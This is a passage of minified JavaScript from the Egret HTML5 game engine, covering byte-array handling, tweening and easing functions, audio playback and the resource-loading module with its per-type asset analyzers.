DataView(this.arraybytes);this.position<t;){var i=e.getUint8(this.position++);if(128>i){if(0==i)break;r+=String.fromCharCode(i)}else if(224>i)r+=String.fromCharCode((63&i)<<6|127&e.getUint8(this.position++));else if(240>i)var n=e.getUint8(this.position++),r=r+String.fromCharCode((31&i)<<12|(127&n)<<6|127&e.getUint8(this.position++));else var n=e.getUint8(this.position++),s=e.getUint8(this.position++),r=r+String.fromCharCode((15&i)<<18|(127&n)<<12|s<<6&127|127&e.getUint8(this.position++))}return r},t.prototype.readInt=function(){var t=new DataView(this.arraybytes).getInt32(this.position,this.isLittleEndian);return this.position+=4,t},t.prototype.readShort=function(){var t=new DataView(this.arraybytes).getInt16(this.position,this.isLittleEndian);return this.position+=2,t},t.prototype.readDouble=function(){var t=new DataView(this.arraybytes).getFloat64(this.position,this.isLittleEndian);return this.position+=8,t},t.prototype.readUnsignedShort=function(){if(this.position>this.length+2)throw"ByteArray out of bounds read. Position="+this.position+", Length="+this.length;if(0==(1&this.position)){var t=new Uint16Array(this.arraybytes),e=this.position>>1;return this.position+=2,t[e]}return t=new Uint16Array(this.unalignedarraybytestemp,0,1),e=new Uint8Array(this.arraybytes,this.position,2),new Uint8Array(this.unalignedarraybytestemp,0,2).set(e),this.position+=2,t[0]},t.prototype.writeUnsignedInt=function(t){if(this.ensureWriteableSpace(4),0==(3&this.position)){var e=new Uint32Array(this.arraybytes);e[this.position>>2]=4294967295&~~t}else e=new Uint32Array(this.unalignedarraybytestemp,0,1),e[0]=4294967295&~~t,t=new Uint8Array(this.arraybytes,this.position,4),e=new Uint8Array(this.unalignedarraybytestemp,0,4),t.set(e);this.position+=4,this.position>this.length&&(this.length=this.position)},t.prototype.readUnsignedInt=function(){if(this.position>this.length+4)throw"ByteArray out of bounds read. Position="+this.position+", Length="+this.length;if(0==(3&this.position)){var t=new Uint32Array(this.arraybytes),e=this.position>>2;return this.position+=4,t[e]}return t=new Uint32Array(this.unalignedarraybytestemp,0,1),e=new Uint8Array(this.arraybytes,this.position,4),new Uint8Array(this.unalignedarraybytestemp,0,4).set(e),this.position+=4,t[0]},t.prototype.writeFloat=function(t){if(this.ensureWriteableSpace(4),0==(3&this.position)){var e=new Float32Array(this.arraybytes);e[this.position>>2]=t}else e=new Float32Array(this.unalignedarraybytestemp,0,1),e[0]=t,t=new Uint8Array(this.arraybytes,this.position,4),e=new Uint8Array(this.unalignedarraybytestemp,0,4),t.set(e);this.position+=4,this.position>this.length&&(this.length=this.position)},t.prototype.readFloat=function(){if(this.position>this.length+4)throw"ByteArray out of bounds read. Positon="+this.position+", Length="+this.length;if(0==(3&this.position)){var t=new Float32Array(this.arraybytes),e=this.position>>2;return this.position+=4,t[e]}return t=new Float32Array(this.unalignedarraybytestemp,0,1),e=new Uint8Array(this.arraybytes,this.position,4),new Uint8Array(this.unalignedarraybytestemp,0,4).set(e),this.position+=4,t[0]},t.DEFAULT_ENDIAN=e.BIG_ENDIAN,t}();t.ByteArray=i,i.prototype.__class__="egret.ByteArray"}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(e){function i(t,i,n){e.call(this),this._target=null,this.loop=this.ignoreGlobalPause=this._useTicks=!1,this._actions=this._steps=this.pluginData=null,this.paused=!1,this.duration=0,this._prevPos=-1,this.position=null,this._stepPosition=this._prevPosition=0,this.passive=!1,this.initialize(t,i,n)}return __extends(i,e),i.get=function(t,e,n,r){return void 0===e&&(e=null),void 0===n&&(n=null),void 0===r&&(r=!1),r&&i.removeTweens(t),new i(t,e,n)},i.removeTweens=function(t){if(t.tween_count){for(var e=i._tweens,n=e.length-1;0<=n;n--)e[n]._target==t&&(e[n].paused=!0,e.splice(n,1));t.tween_count=0}},i.tick=function(t,e){void 0===e&&(e=!1);for(var n=i._tweens.concat(),r=n.length-1;0<=r;r--){var s=n[r];e&&!s.ignoreGlobalPause||s.paused||s.tick(s._useTicks?1:t)}},i._register=function(e,n){var r=e._target,s=i._tweens;if(n)r&&(r.tween_count=r.tween_count?r.tween_count+1:1),s.push(e),i._inited||(t.Ticker.getInstance().register(i.tick,null),i._inited=!0);else for(r&&r.tween_count--,r=s.length;r--;)if(s[r]==e){s.splice(r,1);break}},i.removeAllTweens=function(){for(var t=i._tweens,e=0,n=t.length;e<n;e++){var r=t[e];r.paused=!0,r._target.tweenjs_count=0}t.length=0},i.prototype.initialize=function(t,e,n){this._target=t,e&&(this._useTicks=e.useTicks,this.ignoreGlobalPause=e.ignoreGlobalPause,this.loop=e.loop,e.onChange&&this.addEventListener("change",e.onChange,e.onChangeObj),e.override&&i.removeTweens(t)),this.pluginData=n||{},this._curQueueProps={},this._initQueueProps={},this._steps=[],this._actions=[],e&&e.paused?this.paused=!0:i._register(this,!0),e&&null!=e.position&&this.setPosition(e.position,i.NONE)},i.prototype.setPosition=function(t,e){void 0===e&&(e=1),0>t&&(t=0);var i=t,n=!1;if(i>=this.duration&&(this.loop?i%=this.duration:(i=this.duration,n=!0)),i==this._prevPos)return n;var r=this._prevPos;if(this.position=this._prevPos=i,this._prevPosition=t,this._target)if(n)this._updateTargetProps(null,1);else if(0<this._steps.length){for(var s=0,o=this._steps.length;s<o&&!(this._steps[s].t>i);s++);s=this._steps[s-1],this._updateTargetProps(s,(this._stepPosition=i-s.t)/s.d)}return 0!=e&&0<this._actions.length&&(this._useTicks?this._runActions(i,i):1==e&&i<r?(r!=this.duration&&this._runActions(r,this.duration),this._runActions(0,i,!0)):this._runActions(r,i)),n&&this.setPaused(!0),this.dispatchEventWith("change"),n},i.prototype._runActions=function(t,e,i){void 0===i&&(i=!1);var n=t,r=e,s=-1,o=this._actions.length,a=1;for(t>e&&(n=e,r=t,s=o,o=a=-1);(s+=a)!=o;){var h=(e=this._actions[s]).t;(h==r||h>n&&h<r||i&&h==t)&&e.f.apply(e.o,e.p)}},i.prototype._updateTargetProps=function(t,e){var n,r,s,o;if(t||1!=e){if(this.passive=!!t.v)return;t.e&&(e=t.e(e,0,1,1)),n=t.p0,r=t.p1}else this.passive=!1,n=r=this._curQueueProps;for(var a in this._initQueueProps){null==(s=n[a])&&(n[a]=s=this._initQueueProps[a]),null==(o=r[a])&&(r[a]=o=s),s=s==o||0==e||1==e||"number"!=typeof s?1==e?o:s:s+(o-s)*e;var h=!1;if(o=i._plugins[a])for(var l=0,p=o.length;l<p;l++){var u=o[l].tween(this,a,s,n,r,e,!!t&&n==r,!t);u==i.IGNORE?h=!0:s=u}h||(this._target[a]=s)}},i.prototype.setPaused=function(t){return this.paused=t,i._register(this,!t),this},i.prototype._cloneProps=function(t){var e,i={};for(e in t)i[e]=t[e];return i},i.prototype._addStep=function(t){return 0<t.d&&(this._steps.push(t),t.t=this.duration,this.duration+=t.d),this},i.prototype._appendQueueProps=function(t){var e,n,r,s,o,a;for(a in t)if(void 0===this._initQueueProps[a]){if(n=this._target[a],e=i._plugins[a])for(r=0,s=e.length;r<s;r++)n=e[r].init(this,a,n);this._initQueueProps[a]=this._curQueueProps[a]=void 0===n?null:n}for(a in t){if(n=this._curQueueProps[a],e=i._plugins[a])for(o=o||{},r=0,s=e.length;r<s;r++)e[r].step&&e[r].step(this,a,n,t[a],o);this._curQueueProps[a]=t[a]}return o&&this._appendQueueProps(o),this._curQueueProps},i.prototype._addAction=function(t){return t.t=this.duration,this._actions.push(t),this},i.prototype._set=function(t,e){for(var i in t)e[i]=t[i]},i.prototype.wait=function(t,e){if(null==t||0>=t)return this;var i=this._cloneProps(this._curQueueProps);return this._addStep({d:t,p0:i,p1:i,v:e})},i.prototype.to=function(t,e,i){return void 0===i&&(i=void 0),(isNaN(e)||0>e)&&(e=0),this._addStep({d:e||0,p0:this._cloneProps(this._curQueueProps),e:i,p1:this._cloneProps(this._appendQueueProps(t))})},i.prototype.call=function(t,e,i){return void 0===e&&(e=void 0),void 0===i&&(i=void 0),this._addAction({f:t,p:i||[],o:e||this._target})},i.prototype.set=function(t,e){return void 0===e&&(e=null),this._addAction({f:this._set,o:this,p:[t,e||this._target]})},i.prototype.play=function(t){return t||(t=this),this.call(t.setPaused,t,[!1])},i.prototype.pause=function(t){return t||(t=this),this.call(t.setPaused,t,[!0])},i.prototype.tick=function(t){this.paused||this.setPosition(this._prevPosition+t)},i.NONE=0,i.LOOP=1,i.REVERSE=2,i._tweens=[],i.IGNORE={},i._plugins={},i._inited=!1,i}(t.EventDispatcher);t.Tween=e,e.prototype.__class__="egret.Tween"}(egret||(egret={})),function(t){var e=function(){function e(){t.Logger.fatal("Ease不能被实例化")}return e.get=function(t){return-1>t&&(t=-1),1<t&&(t=1),function(e){return 0==t?e:0>t?e*(e*-t+1+t):e*((2-e)*t+(1-t))}},e.getPowIn=function(t){return function(e){return Math.pow(e,t)}},e.getPowOut=function(t){return function(e){return 1-Math.pow(1-e,t)}},e.getPowInOut=function(t){return function(e){return 1>(e*=2)?.5*Math.pow(e,t):1-.5*Math.abs(Math.pow(2-e,t))}},e.sineIn=function(t){return 1-Math.cos(t*Math.PI/2)},e.sineOut=function(t){return Math.sin(t*Math.PI/2)},e.sineInOut=function(t){return-.5*(Math.cos(Math.PI*t)-1)},e.getBackIn=function(t){return function(e){return e*e*((t+1)*e-t)}},e.getBackOut=function(t){return function(e){return(e-=1)*e*((t+1)*e+t)+1}},e.getBackInOut=function(t){return t*=1.525,function(e){return 1>(e*=2)?.5*e*e*((t+1)*e-t):.5*((e-=2)*e*((t+1)*e+t)+2)}},e.circIn=function(t){return-(Math.sqrt(1-t*t)-1)},e.circOut=function(t){return Math.sqrt(1-t*t)},e.circInOut=function(t){return 1>(t*=2)?-.5*(Math.sqrt(1-t*t)-1):.5*(Math.sqrt(1-(t-=2)*t)+1)},e.bounceIn=function(t){return 1-e.bounceOut(1-t)},e.bounceOut=function(t){return t<1/2.75?7.5625*t*t:t<2/2.75?7.5625*(t-=1.5/2.75)*t+.75:t<2.5/2.75?7.5625*(t-=2.25/2.75)*t+.9375:7.5625*(t-=2.625/2.75)*t+.984375},e.bounceInOut=function(t){return.5>t?.5*e.bounceIn(2*t):.5*e.bounceOut(2*t-1)+.5},e.getElasticIn=function(t,e){var i=2*Math.PI;return function(n){if(0==n||1==n)return n;var r=e/i*Math.asin(1/t);return-t*Math.pow(2,10*(n-=1))*Math.sin((n-r)*i/e)}},e.getElasticOut=function(t,e){var i=2*Math.PI;return function(n){if(0==n||1==n)return n;var r=e/i*Math.asin(1/t);return t*Math.pow(2,-10*n)*Math.sin((n-r)*i/e)+1}},e.getElasticInOut=function(t,e){var i=2*Math.PI;return function(n){var r=e/i*Math.asin(1/t);return 1>(n*=2)?-.5*t*Math.pow(2,10*(n-=1))*Math.sin((n-r)*i/e):t*Math.pow(2,-10*(n-=1))*Math.sin((n-r)*i/e)*.5+1}},e.quadIn=e.getPowIn(2),e.quadOut=e.getPowOut(2),e.quadInOut=e.getPowInOut(2),e.cubicIn=e.getPowIn(3),e.cubicOut=e.getPowOut(3),e.cubicInOut=e.getPowInOut(3),e.quartIn=e.getPowIn(4),e.quartOut=e.getPowOut(4),e.quartInOut=e.getPowInOut(4),e.quintIn=e.getPowIn(5),e.quintOut=e.getPowOut(5),e.quintInOut=e.getPowInOut(5),e.backIn=e.getBackIn(1.7),e.backOut=e.getBackOut(1.7),e.backInOut=e.getBackInOut(1.7),e.elasticIn=e.getElasticIn(1,.3),e.elasticOut=e.getElasticOut(1,.3),e.elasticInOut=e.getElasticInOut(1,.3*1.5),e}();t.Ease=e,e.prototype.__class__="egret.Ease"}(egret||(egret={})),function(t){var e=function(){function t(){}return t.prototype.play=function(t){void 0===t&&(t=!1);var e=this.audio;e&&(isNaN(e.duration)||(e.currentTime=0),e.loop=t,e.play())},t.prototype.pause=function(){var t=this.audio;t&&t.pause()},t.prototype.load=function(){var t=this.audio;t&&t.load()},t.prototype.addEventListener=function(t,e){this.audio&&this.audio.addEventListener(t,e,!1)},t.prototype.removeEventListener=function(t,e){this.audio&&this.audio.removeEventListener(t,e,!1)},t.prototype.setVolume=function(t){var e=this.audio;e&&(e.volume=t)},t.prototype.getVolume=function(){return this.audio?this.audio.volume:0},t}();t.Sound=e,e.prototype.__class__="egret.Sound"}(egret||(egret={})),function(t){var e=function(){function t(){}return t.isNumber=function(t){return"number"==typeof t&&!isNaN(t)},t}();t.NumberUtils=e,e.prototype.__class__="egret.NumberUtils"}(egret||(egret={}));var __extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},RES;!function(t){var e=function(t){function e(e,i,n){void 0===i&&(i=!1),void 0===n&&(n=!1),t.call(this,e,i,n),this.itemsTotal=this.itemsLoaded=0}return __extends(e,t),e.dispatchResourceEvent=function(t,i,n,r,s,o){void 0===n&&(n=""),void 0===r&&(r=null),void 0===s&&(s=0),void 0===o&&(o=0);var a=egret.Event._getPropertyData(e);a.groupName=n,a.resItem=r,a.itemsLoaded=s,a.itemsTotal=o,egret.Event._dispatchByTarget(e,t,i,a)},e.ITEM_LOAD_ERROR="itemLoadError",e.CONFIG_COMPLETE="configComplete",e.GROUP_PROGRESS="groupProgress",e.GROUP_COMPLETE="groupComplete",e}(egret.Event);t.ResourceEvent=e,e.prototype.__class__="RES.ResourceEvent"}(RES||(RES={})),function(t){var e=function(){function t(t,e,i){this._loaded=!1,this.name=t,this.url=e,this.type=i}return Object.defineProperty(t.prototype,"loaded",{get:function(){return this.data?this.data.loaded:this._loaded},set:function(t){this.data&&(this.data.loaded=t),this._loaded=t},enumerable:!0,configurable:!0}),t.prototype.toString=function(){return'[ResourceItem name="'+this.name+'" url="'+this.url+'" type="'+this.type+'"]'},t.TYPE_XML="xml",t.TYPE_IMAGE="image",t.TYPE_BIN="bin",t.TYPE_TEXT="text",t.TYPE_JSON="json",t.TYPE_SHEET="sheet",t.TYPE_FONT="font",t.TYPE_SOUND="sound",t}();t.ResourceItem=e,e.prototype.__class__="RES.ResourceItem"}(RES||(RES={})),function(t){var e=function(){function e(){this.keyMap={},this.groupDic={}}return e.prototype.getGroupByName=function(t){var e=[];if(!this.groupDic[t])return e;for(var i=(t=this.groupDic[t]).length,n=0;n<i;n++)e.push(this.parseResourceItem(t[n]));return e},e.prototype.getRawGroupByName=function(t){return this.groupDic[t]?this.groupDic[t]:[]},e.prototype.createGroup=function(t,e,i){if(void 0===i&&(i=!1),!i&&this.groupDic[t]||!e||0==e.length)return!1;i=this.groupDic;for(var n=[],r=e.length,s=0;s<r;s++){var o=i[a=e[s]];if(o)for(var a=o.length,h=0;h<a;h++){var l=o[h];-1==n.indexOf(l)&&n.push(l)}else(l=this.keyMap[a])&&-1==n.indexOf(l)&&n.push(l)}return 0!=n.length&&(this.groupDic[t]=n,!0)},e.prototype.parseConfig=function(t,e){if(t){var i=t.resources;if(i)for(var n=i.length,r=0;r<n;r++){var s=i[r];(o=s.url)&&-1==o.indexOf("://")&&(s.url=e+o),this.addItemToKeyMap(s)}if(i=t.groups)for(n=i.length,r=0;r<n;r++){for(var o=i[r],a=[],h=o.keys.split(","),l=h.length,p=0;p<l;p++)s=h[p].trim(),(s=this.keyMap[s])&&-1==a.indexOf(s)&&a.push(s);this.groupDic[o.name]=a}}},e.prototype.addItemToKeyMap=function(t){if(this.keyMap[t.name]||(this.keyMap[t.name]=t),t.hasOwnProperty("subkeys")){var e=t.subkeys.split(",");t.subkeys=e;for(var i=e.length,n=0;n<i;n++){var r=e[n];null==this.keyMap[r]&&(this.keyMap[r]=t)}}},e.prototype.getName=function(t){return(t=this.keyMap[t])?t.name:""},e.prototype.getType=function(t){return(t=this.keyMap[t])?t.type:""},e.prototype.getRawResourceItem=function(t){return this.keyMap[t]},e.prototype.getResourceItem=function(t){return(t=this.keyMap[t])?this.parseResourceItem(t):null},e.prototype.parseResourceItem=function(e){var i=new t.ResourceItem(e.name,e.url,e.type);return i.data=e,i},e}();t.ResourceConfig=e,e.prototype.__class__="RES.ResourceConfig"}(RES||(RES={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(e){function i(){e.call(this),this.thread=2,this.loadingCount=0,this.groupTotalDic={},this.numLoadedDic={},this.itemListDic={},this.priorityQueue={},this.lazyLoadList=[],this.analyzerDic={},this.queueIndex=0}return __extends(i,e),i.prototype.isGroupInLoading=function(t){return void 0!==this.itemListDic[t]},i.prototype.loadGroup=function(e,i,n){if(void 0===n&&(n=0),!this.itemListDic[i]&&i)if(e&&0!=e.length){this.priorityQueue[n]?this.priorityQueue[n].push(i):this.priorityQueue[n]=[i],this.itemListDic[i]=e,n=e.length;for(var r=0;r<n;r++)e[r].groupName=i;this.groupTotalDic[i]=e.length,this.numLoadedDic[i]=0,this.next()}else e=new t.ResourceEvent(t.ResourceEvent.GROUP_COMPLETE),e.groupName=i,this.dispatchEvent(e)},i.prototype.loadItem=function(t){this.lazyLoadList.push(t),t.groupName="",this.next()},i.prototype.next=function(){for(;this.loadingCount<this.thread;){var e=this.getOneResourceItem();if(!e)break;if(this.loadingCount++,e.loaded)this.onItemComplete(e);else{var i=this.analyzerDic[e.type];i||(i=this.analyzerDic[e.type]=egret.Injector.getInstance(t.AnalyzerBase,e.type)),i.loadFile(e,this.onItemComplete,this)}}},i.prototype.getOneResourceItem=function(){var t,e=Number.NEGATIVE_INFINITY;for(t in this.priorityQueue)e=Math.max(e,t);if(!(e=this.priorityQueue[e])||0==e.length)return 0==this.lazyLoadList.length?null:this.lazyLoadList.pop();t=e.length;for(var i,n=0;n<t&&(this.queueIndex>=t&&(this.queueIndex=0),!(0<(i=this.itemListDic[e[this.queueIndex]]).length));n++)this.queueIndex++;return 0==i.length?null:i.shift()},i.prototype.onItemComplete=function(e){this.loadingCount--;var i=e.groupName;if(e.loaded||t.ResourceEvent.dispatchResourceEvent(this.resInstance,t.ResourceEvent.ITEM_LOAD_ERROR,i,e),i){this.numLoadedDic[i]++;var n=this.numLoadedDic[i],r=this.groupTotalDic[i];t.ResourceEvent.dispatchResourceEvent(this.resInstance,t.ResourceEvent.GROUP_PROGRESS,i,e,n,r),n==r&&(this.removeGroupName(i),delete this.groupTotalDic[i],delete this.numLoadedDic[i],delete this.itemListDic[i],t.ResourceEvent.dispatchResourceEvent(this,t.ResourceEvent.GROUP_COMPLETE,i))}else this.callBack.call(this.resInstance,e);this.next()},i.prototype.removeGroupName=function(t){for(var e in this.priorityQueue){for(var i=this.priorityQueue[e],n=i.length,r=0,s=!1,n=i.length,o=0;o<n;o++){if(i[o]==t){i.splice(r,1),s=!0;break}r++}if(s){0==i.length&&delete this.priorityQueue[e];break}}},i}(egret.EventDispatcher);t.ResourceLoader=e,e.prototype.__class__="RES.ResourceLoader"}(RES||(RES={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(t){function e(){t.call(this)}return __extends(e,t),e.prototype.loadFile=function(t,e,i){},e.prototype.getRes=function(t){},e.prototype.destroyRes=function(t){return!1},e.getStringPrefix=function(t){if(!t)return"";var e=t.indexOf(".");return-1!=e?t.substring(0,e):""},e.getStringTail=function(t){if(!t)return"";var e=t.indexOf(".");return-1!=e?t.substring(e+1):""},e}(egret.HashObject);t.AnalyzerBase=e,e.prototype.__class__="RES.AnalyzerBase"}(RES||(RES={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(t){function e(){t.call(this),this.fileDic={},this.resItemDic=[],this._dataFormat=egret.URLLoaderDataFormat.BINARY,this.recycler=new egret.Recycler}return __extends(e,t),e.prototype.loadFile=function(t,e,i){if(this.fileDic[t.name])e.call(i,t);else{var n=this.getLoader();this.resItemDic[n.hashCode]={item:t,func:e,thisObject:i},n.load(new egret.URLRequest(t.url))}},e.prototype.getLoader=function(){var t=this.recycler.pop();return t||((t=new egret.URLLoader).addEventListener(egret.Event.COMPLETE,this.onLoadFinish,this),t.addEventListener(egret.IOErrorEvent.IO_ERROR,this.onLoadFinish,this)),t.dataFormat=this._dataFormat,t},e.prototype.onLoadFinish=function(t){var e=t.target,i=this.resItemDic[e.hashCode];delete this.resItemDic[e.hashCode],this.recycler.push(e);var n=i.item,r=i.func;n.loaded=t.type==egret.Event.COMPLETE,n.loaded&&this.analyzeData(n,e.data),r.call(i.thisObject,n)},e.prototype.analyzeData=function(t,e){var i=t.name;!this.fileDic[i]&&e&&(this.fileDic[i]=e)},e.prototype.getRes=function(t){return this.fileDic[t]},e.prototype.hasRes=function(t){return null!=this.getRes(t)},e.prototype.destroyRes=function(t){return!!this.fileDic[t]&&(delete this.fileDic[t],!0)},e}(t.AnalyzerBase);t.BinAnalyzer=e,e.prototype.__class__="RES.BinAnalyzer"}(RES||(RES={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(t){function e(){t.call(this),this._dataFormat=egret.URLLoaderDataFormat.TEXTURE}return __extends(e,t),e.prototype.analyzeData=function(t,e){var i=t.name;!this.fileDic[i]&&e&&(this.fileDic[i]=e,(i=t.data)&&i.scale9grid&&(i=i.scale9grid.split(","),e.scale9Grid=new egret.Rectangle(parseInt(i[0]),parseInt(i[1]),parseInt(i[2]),parseInt(i[3]))))},e}(t.BinAnalyzer);t.ImageAnalyzer=e,e.prototype.__class__="RES.ImageAnalyzer"}(RES||(RES={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(t){function e(){t.call(this),this._dataFormat=egret.URLLoaderDataFormat.TEXT}return __extends(e,t),e.prototype.analyzeData=function(t,e){var i=t.name;if(!this.fileDic[i]&&e)try{this.fileDic[i]=JSON.parse(e)}catch(e){egret.Logger.warning("JSON文件格式不正确: "+t.url)}},e}(t.BinAnalyzer);t.JsonAnalyzer=e,e.prototype.__class__="RES.JsonAnalyzer"}(RES||(RES={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(t){function e(){t.call(this),this._dataFormat=egret.URLLoaderDataFormat.TEXT}return __extends(e,t),e}(t.BinAnalyzer);t.TextAnalyzer=e,e.prototype.__class__="RES.TextAnalyzer"}(RES||(RES={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(e){function i(){e.call(this),this.sheetMap={},this.textureMap={},this._dataFormat=egret.URLLoaderDataFormat.TEXT}return __extends(i,e),i.prototype.getRes=function(e){var i=this.fileDic[e];return i||(i=this.textureMap[e]),!i&&(i=t.AnalyzerBase.getStringPrefix(e),i=this.fileDic[i])&&(e=t.AnalyzerBase.getStringTail(e),i=i.getTexture(e)),i},i.prototype.onLoadFinish=function(t){var e=t.target,i=this.resItemDic[e.hashCode];delete this.resItemDic[e.hashCode],this.recycler.push(e);var n=i.item,r=i.func;n.loaded=t.type==egret.Event.COMPLETE,n.loaded&&this.analyzeData(n,e.data),"string"==typeof e.data?(this._dataFormat=egret.URLLoaderDataFormat.TEXTURE,this.loadFile(n,r,i.thisObject),this._dataFormat=egret.URLLoaderDataFormat.TEXT):r.call(i.thisObject,n)},i.prototype.analyzeData=function(t,e){var i=t.name;if(!this.fileDic[i]&&e){var n;if("string"==typeof e){try{n=JSON.parse(e)}catch(e){egret.Logger.warning("JSON文件格式不正确: "+t.url)}n&&(this.sheetMap[i]=n,t.loaded=!1,t.url=this.getRelativePath(t.url,n.file))}else n=this.sheetMap[i],delete this.sheetMap[i],e&&(n=this.parseSpriteSheet(e,n),this.fileDic[i]=n)}},i.prototype.getRelativePath=function(t,e){var i=(t=t.split("\\").join("/")).lastIndexOf("/");return t=-1!=i?t.substring(0,i+1)+e:e},i.prototype.parseSpriteSheet=function(t,e){var i=e.frames;if(!i)return null;var n,r=new egret.SpriteSheet(t),s=this.textureMap;for(n in i){var o=i[n];t=r.createTexture(n,o.x,o.y,o.w,o.h,o.offX,o.offY,o.sourceW,o.sourceH),null==s[n]&&(s[n]=t)}return r},i}(t.BinAnalyzer);t.SheetAnalyzer=e,e.prototype.__class__="RES.SheetAnalyzer"}(RES||(RES={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(t){function e(){t.call(this)}return __extends(e,t),e.prototype.analyzeData=function(t,e){var i=t.name;if(!this.fileDic[i]&&e){var n;"string"==typeof e?(n=e,this.sheetMap[i]=n,t.loaded=!1,t.url=this.getTexturePath(t.url,n)):(n=this.sheetMap[i],delete this.sheetMap[i],e&&(n=new egret.BitmapTextSpriteSheet(e,n),this.fileDic[i]=n))}},e.prototype.getTexturePath=function(t,e){var i="",n=e.split("\n")[2],r=n.indexOf('file="');return-1!=r&&(n=n.substring(r+6),r=n.indexOf('"'),i=n.substring(0,r)),t=t.split("\\").join("/"),r=t.lastIndexOf("/"),t=-1!=r?t.substring(0,r+1)+i:i},e}(t.SheetAnalyzer);t.FontAnalyzer=e,e.prototype.__class__="RES.FontAnalyzer"}(RES||(RES={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(t){function e(){t.call(this),this._dataFormat=egret.URLLoaderDataFormat.SOUND}return __extends(e,t),e}(t.BinAnalyzer);t.SoundAnalyzer=e,e.prototype.__class__="RES.SoundAnalyzer"}(RES||(RES={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(t){function e(){t.call(this),this._dataFormat=egret.URLLoaderDataFormat.TEXT}return __extends(e,t),e.prototype.analyzeData=function(t,e){var i=t.name;if(!this.fileDic[i]&&e)try{var n=egret.XML.parse(e);this.fileDic[i]=n}catch(t){}},e}(t.BinAnalyzer);t.XMLAnalyzer=e,e.prototype.__class__="RES.XMLAnalyzer"}(RES||(RES={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){t.loadConfig=function(t,e,n){void 0===e&&(e=""),void 0===n&&(n="json"),i.loadConfig(t,e,n)},t.loadGroup=function(t,e){void 0===e&&(e=0),i.loadGroup(t,e)},t.isGroupLoaded=function(t){return i.isGroupLoaded(t)},t.getGroupByName=function(t){return i.getGroupByName(t)},t.createGroup=function(t,e,n){return void 0===n&&(n=!1),i.createGroup(t,e,n)},t.hasRes=function(t){return i.hasRes(t)},t.getRes=function(t){return i.getRes(t)},t.getResAsync=function(t,e,n){i.getResAsync(t,e,n)},t.getResByUrl=function(t,e,n,r){void 0===r&&(r=""),i.getResByUrl(t,e,n,r)},t.destroyRes=function(t){return i.destroyRes(t)},t.setMaxLoadingThread=function(t){i.setMaxLoadingThread(t)},t.addEventListener=function(t,e,n,r,s){void 0===r&&(r=!1),void 0===s&&(s=0),i.addEventListener(t,e,n,r,s)},t.removeEventListener=function(t,e,n,r){void 0===r&&(r=!1),i.removeEventListener(t,e,n,r)};var e=function(e){function i(){e.call(this),this.analyzerDic={},this.configItemList=[],this.configComplete=this.callLaterFlag=!1,this.loadedGroups=[],this.groupNameList=[],this.asyncDic={},this.init()}return __extends(i,e),i.prototype.getAnalyzerByType=function(e){var i=this.analyzerDic[e];return i||(i=this.analyzerDic[e]=egret.Injector.getInstance(t.AnalyzerBase,e)),i},i.prototype.init=function(){egret.Injector.hasMapRule(t.AnalyzerBase,t.ResourceItem.TYPE_BIN)||egret.Injector.mapClass(t.AnalyzerBase,t.BinAnalyzer,t.ResourceItem.TYPE_BIN),egret.Injector.hasMapRule(t.AnalyzerBase,t.ResourceItem.TYPE_IMAGE)||egret.Injector.mapClass(t.AnalyzerBase,t.ImageAnalyzer,t.ResourceItem.TYPE_IMAGE),egret.Injector.hasMapRule(t.AnalyzerBase,t.ResourceItem.TYPE_TEXT)||egret.Injector.mapClass(t.AnalyzerBase,t.TextAnalyzer,t.ResourceItem.TYPE_TEXT),egret.Injector.hasMapRule(t.AnalyzerBase,t.ResourceItem.TYPE_JSON)||egret.Injector.mapClass(t.AnalyzerBase,t.JsonAnalyzer,t.ResourceItem.TYPE_JSON),egret.Injector.hasMapRule(t.AnalyzerBase,t.ResourceItem.TYPE_SHEET)||egret.Injector.mapClass(t.AnalyzerBase,t.SheetAnalyzer,t.ResourceItem.TYPE_SHEET),egret.Injector.hasMapRule(t.AnalyzerBase,t.ResourceItem.TYPE_FONT)||egret.Injector.mapClass(t.AnalyzerBase,t.FontAnalyzer,t.ResourceItem.TYPE_FONT),egret.Injector.hasMapRule(t.AnalyzerBase,t.ResourceItem.TYPE_SOUND)||egret.Injector.mapClass(t.AnalyzerBase,t.SoundAnalyzer,t.ResourceItem.TYPE_SOUND),egret.Injector.hasMapRule(t.AnalyzerBase,t.ResourceItem.TYPE_XML)||egret.Injector.mapClass(t.AnalyzerBase,t.XMLAnalyzer,t.ResourceItem.TYPE_XML),this.resConfig=